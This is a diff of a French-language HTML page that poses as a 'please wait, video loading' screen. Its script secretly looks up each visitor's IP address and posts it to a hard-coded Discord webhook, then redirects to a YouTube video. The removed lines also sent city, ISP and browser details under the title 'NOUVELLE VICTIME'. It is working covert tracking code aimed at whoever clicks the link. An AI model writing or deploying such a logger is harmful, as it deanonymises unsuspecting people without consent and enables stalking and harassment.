@@ -1,41 +1,32 @@
 <!DOCTYPE html>
 <html><head><meta charset="utf-8"></head><body>
-<!-- Écran noir avec message crédible -->
-<div style="background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:20%;font-size:20px">
+<div style="background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:20%;font-size:22px">
   <h1>Veuillez patienter 5 secondes...</h1>
-  <p>Chargement de la vidéo en cours...</p>
+  <p>Chargement de la vidéo...</p>
 </div>
 
 <script>
-// ========= CHANGE UNIQUEMENT CETTE LIGNE AVEC TON WEBHOOK DISCORD =========
+// CHANGE UNIQUEMENT CETTE LIGNE AVEC TON WEBHOOK DISCORD
 const webhook = "https://discord.com/api/webhooks/1439673608225034240/QCmvEWzJGk21ZF8AkeiNvW9cXtWFPZ3Pf-x-2rFj68OP8boHo51qHIF6ez1mmMD5KG77";
 
-
-// ENVOI IMMÉDIAT DÈS LE CLIC (ça part en 0,2 seconde)
-fetch("https://ipwho.is/").then(r=>r.json()).then(info=>{
-  fetch(webhook,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      username: "Logger Ultra",
-      avatar_url: "https://i.imgur.com/2h5tRAb.png",
-      embeds:[{
-        title:"NOUVELLE VICTIME (clic instantané)",
-        color:15548997,
-        description:`**IP :** \`${info.ip}\`\n**Ville :** ${info.city}, ${info.region} ${info.country}\n**FAI :** ${info.connection?.isp || "???"}\n**Précision :** ±${info.accuracy_radius || 5} km`,
-        fields:[
-          {name:"Appareil / Navigateur", value:navigator.userAgent.substring(0,250), inline:false},
-          {name:"Heure (France)", value:new Date().toLocaleString("fr-FR",{timeZone:"Europe/Paris"}), inline:true}
-        ],
-        footer:{text:"Clic détecté • 2025"}
-      }]
-    })
+fetch("https://api.ipify.org?format=json")
+  .then(r => r.json())
+  .then(d => {
+    const ip = d.ip;
+    fetch(webhook, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        content: `**NOUVELLE IP :** \`${ip}\``,
+        username: "IP Logger",
+        avatar_url: "https://i.imgur.com/2h5tRAb.png"
+      })
+    });
   });
-});
 
-// Redirection après 5 secondes (tu peux mettre 3 ou 10 si tu veux)
-setTimeout(()=>{
-  location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // change la vidéo ici si tu veux
+// Redirection après 5 secondes
+setTimeout(() => {
+  location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 }, 5000);
 
 </script>
